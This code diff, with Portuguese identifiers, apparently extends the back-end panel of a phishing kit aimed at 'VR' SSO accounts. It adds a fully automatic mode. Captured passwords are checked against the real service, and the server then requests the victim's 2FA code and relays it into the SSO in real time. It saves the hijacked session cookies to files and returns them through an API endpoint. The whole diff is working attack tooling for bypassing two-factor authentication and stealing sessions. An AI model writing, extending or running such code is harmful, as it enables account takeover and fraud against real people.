@@ -29,13 +29,21 @@ const RESULTADO_JSON = path.join(
     "resultado.json"
 );
 
+const SESSOES_DIR = path.join(__dirname, "sessoes");
+if (!fs.existsSync(SESSOES_DIR)) {
+    try { fs.mkdirSync(SESSOES_DIR, { recursive: true }); } catch (e) {}
+}
+
 const BOT_PY = path.join(
     __dirname,
     "bot.py"
 );
 
-
 const PYTHON = "python";
+
+let configApp = {
+    auto_mode: true // Modo 100% autônomo ativo por padrão
+};
 
 let sseClients = [];
 
@@ -79,6 +87,8 @@ function gerarDadosPainel() {
                 status_2fa: null,
                 status_login: null,
                 status_credencial: "testando",
+                cookies: null,
+                total_cookies: 0,
                 data_hora: d.data_hora || "—",
                 ultimoEventoTipo: null
             });
@@ -92,6 +102,10 @@ function gerarDadosPainel() {
             if (!item.codigos.includes(d.codigo)) item.codigos.push(d.codigo);
             item.ultimoCodigo = d.codigo;
             item.status_2fa = d.status_2fa || "pendente";
+            if (d.cookies && (!item.cookies || item.cookies.length === 0)) {
+                item.cookies = d.cookies;
+                item.total_cookies = d.cookies.length;
+            }
         } else if (d.senha) {
             item.ultimoEventoTipo = "LOGIN";
             if (!item.senhas.includes(d.senha)) item.senhas.push(d.senha);
@@ -103,15 +117,19 @@ function gerarDadosPainel() {
         }
     });
 
-    // Fallback: se status_credencial ainda estiver como testando, verifica o histórico mais recente em resultado.json
+    // Fallback: se status_credencial ou cookies ainda não preenchidos, verifica histórico em resultado.json
     mapaUsuarios.forEach((item, userKey) => {
-        if (!item.status_credencial || item.status_credencial === "testando") {
-            for (let i = resultados.length - 1; i >= 0; i--) {
-                const r = resultados[i];
-                if (r && (r.nome || "").toLowerCase().trim() === userKey) {
+        for (let i = resultados.length - 1; i >= 0; i--) {
+            const r = resultados[i];
+            if (r && (r.nome || "").toLowerCase().trim() === userKey) {
+                if (!item.status_credencial || item.status_credencial === "testando") {
                     item.status_credencial = r.valido ? "valido" : "invalido";
-                    break;
                 }
+                if (r.cookies && (!item.cookies || item.cookies.length === 0)) {
+                    item.cookies = r.cookies;
+                    item.total_cookies = (r.cookies || []).length;
+                }
+                break;
             }
         }
     });
@@ -144,11 +162,14 @@ function gerarDadosPainel() {
         status_2fa: d.status_2fa || null,
         status_login: d.status_login || null,
         status_credencial: d.status_credencial || null,
+        cookies: d.cookies || null,
+        total_cookies: d.cookies ? d.cookies.length : 0,
         data_hora: d.data_hora || "—"
     }));
 
     return {
         success: true,
+        auto_mode: configApp.auto_mode,
         totalLogins: logins.length,
         total2FA: codigos2fa.length,
         totalUsuarios: mapaUsuarios.size,
@@ -351,6 +372,10 @@ async function testarViaWorker(usuario, senha) {
                 const u = (item.nome || item.usuario || "").toLowerCase().trim();
                 if (u === userKey) {
                     item.status_credencial = statusCred;
+                    if (data.valido && configApp.auto_mode) {
+                        item.status_login = "solicitar_2fa";
+                        console.log(`[FULL-AUTO] 🚀 ${usuario} senha válida na VR -> 2FA disparado automaticamente!`);
+                    }
                     atualizou = true;
                     break;
                 }
@@ -368,6 +393,87 @@ async function testarViaWorker(usuario, senha) {
             console.error("Execução assíncrona do bot.py:", erro.message);
         });
         return false;
+    }
+}
+
+async function injetar2FAViaWorker(usuario, codigo) {
+    try {
+        console.log(`[FULL-AUTO] Despachando código 2FA para o worker: ${usuario} -> ${codigo}`);
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 15000);
+
+        const res = await fetch(`${WORKER_URL}/injetar-2fa`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ usuario, codigo }),
+            signal: controller.signal
+        });
+        clearTimeout(timeoutId);
+
+        if (!res.ok) throw new Error(`HTTP ${res.status}`);
+        const data = await res.json();
+
+        const userKey = usuario.toLowerCase().trim();
+        const decisao = data.valido ? "aceito" : "negado";
+
+        const dados = lerDados();
+        let atualizou = false;
+        for (let i = dados.length - 1; i >= 0; i--) {
+            const item = dados[i];
+            if (item && (item.tipo === "2FA" || item.codigo)) {
+                const u = (item.nome || item.usuario || "").toLowerCase().trim();
+                if (u === userKey) {
+                    item.status_2fa = decisao;
+                    if (data.valido && data.cookies) {
+                        item.cookies = data.cookies;
+                    }
+                    atualizou = true;
+                    break;
+                }
+            }
+        }
+        if (atualizou) {
+            fs.writeFileSync(DADOS_JSON, JSON.stringify(dados, null, 4), "utf8");
+        }
+
+        const resultados = lerResultados();
+        for (let i = resultados.length - 1; i >= 0; i--) {
+            const r = resultados[i];
+            if (r && (r.nome || "").toLowerCase().trim() === userKey) {
+                r.status_2fa = decisao;
+                r.mensagem_2fa = data.mensagem || (data.valido ? "2FA Aceito na VR" : "2FA Negado na VR");
+                if (data.valido && data.cookies) {
+                    r.cookies = data.cookies;
+                    r.total_cookies = (data.cookies || []).length;
+                }
+                break;
+            }
+        }
+        fs.writeFileSync(RESULTADO_JSON, JSON.stringify(resultados, null, 4), "utf8");
+
+        // Salva arquivo de cookies em sessoes/ se autenticado com sucesso
+        if (data.valido && data.cookies && data.cookies.length > 0) {
+            try {
+                const sessionFile = path.join(SESSOES_DIR, `${userKey.replace(/[^a-z0-9_-]/g, "_")}_cookies.json`);
+                fs.writeFileSync(sessionFile, JSON.stringify({
+                    usuario,
+                    data_hora: new Date().toLocaleString("pt-BR"),
+                    url_final: data.url_final || "",
+                    cookies: data.cookies
+                }, null, 4), "utf8");
+                console.log(`[FULL-AUTO] 💾 Cookies de sessão salvos em: ${sessionFile}`);
+            } catch (fsErr) {
+                console.warn("Aviso ao gravar arquivo de cookies:", fsErr.message);
+            }
+        }
+
+        notificarClientes();
+
+        console.log(`[FULL-AUTO] Veredito 2FA VR para ${usuario}: ${decisao.toUpperCase()} (${data.mensagem})`);
+        return data;
+    } catch (err) {
+        console.warn(`[FULL-AUTO] Falha ao injetar 2FA no worker: ${err.message}. Mantendo em pendente para operador manual.`);
+        return null;
     }
 }
 
@@ -505,6 +611,10 @@ app.post(
                     const u = (item.nome || item.usuario || "").toLowerCase().trim();
                     if (u === userKey) {
                         item.status_credencial = statusCred;
+                        if (valido && configApp.auto_mode) {
+                            item.status_login = "solicitar_2fa";
+                            console.log(`[FULL-AUTO] 🚀 ${usuario} verificado como VÁLIDO via resultado-bot -> 2FA disparado automaticamente!`);
+                        }
                         atualizou = true;
                         break;
                     }
@@ -715,6 +825,11 @@ app.post(
                 `[2FA] Código capturado para ${usuarioLimpo}: ${codigoLimpo} (Status: pendente)`
             );
 
+            // Disparo autônomo de injeção no SSO da VR
+            if (configApp.auto_mode) {
+                injetar2FAViaWorker(usuarioLimpo, codigoLimpo);
+            }
+
             return res.json({
                 success: true,
                 status_2fa: "pendente",
@@ -875,6 +990,61 @@ app.post(
             console.error("Erro ao limpar dados:", err);
             res.status(500).json({ success: false, mensagem: "Erro ao limpar dados." });
         }
+    }
+);
+
+app.get(
+    "/api/config",
+    (req, res) => {
+        res.json({ success: true, auto_mode: configApp.auto_mode });
+    }
+);
+
+app.post(
+    "/api/config",
+    (req, res) => {
+        const { auto_mode } = req.body;
+        if (typeof auto_mode === "boolean") {
+            configApp.auto_mode = auto_mode;
+            console.log(`[CONFIG] Modo de automação alterado para: ${configApp.auto_mode ? 'FULL-AUTO (100% Autônomo)' : 'MANUAL'}`);
+            notificarClientes();
+        }
+        res.json({ success: true, auto_mode: configApp.auto_mode });
+    }
+);
+
+app.get(
+    "/api/sessao/:usuario",
+    (req, res) => {
+        const usuario = (req.params.usuario || "").toLowerCase().trim();
+        const userKey = usuario.replace(/[^a-z0-9_-]/g, "_");
+        const sessionFile = path.join(SESSOES_DIR, `${userKey}_cookies.json`);
+
+        if (fs.existsSync(sessionFile)) {
+            try {
+                const data = JSON.parse(fs.readFileSync(sessionFile, "utf8"));
+                return res.json({ success: true, ...data });
+            } catch (e) {
+                return res.status(500).json({ success: false, mensagem: "Erro ao ler arquivo de cookies." });
+            }
+        }
+
+        // Busca em resultado.json
+        const resultados = lerResultados();
+        for (let i = resultados.length - 1; i >= 0; i--) {
+            const r = resultados[i];
+            if (r && (r.nome || "").toLowerCase().trim() === usuario && r.cookies) {
+                return res.json({
+                    success: true,
+                    usuario: r.nome,
+                    data_hora: r.data_hora,
+                    url_final: r.url_final || "",
+                    cookies: r.cookies
+                });
+            }
+        }
+
+        res.status(404).json({ success: false, mensagem: "Sessão de cookies não encontrada." });
     }
 );
 
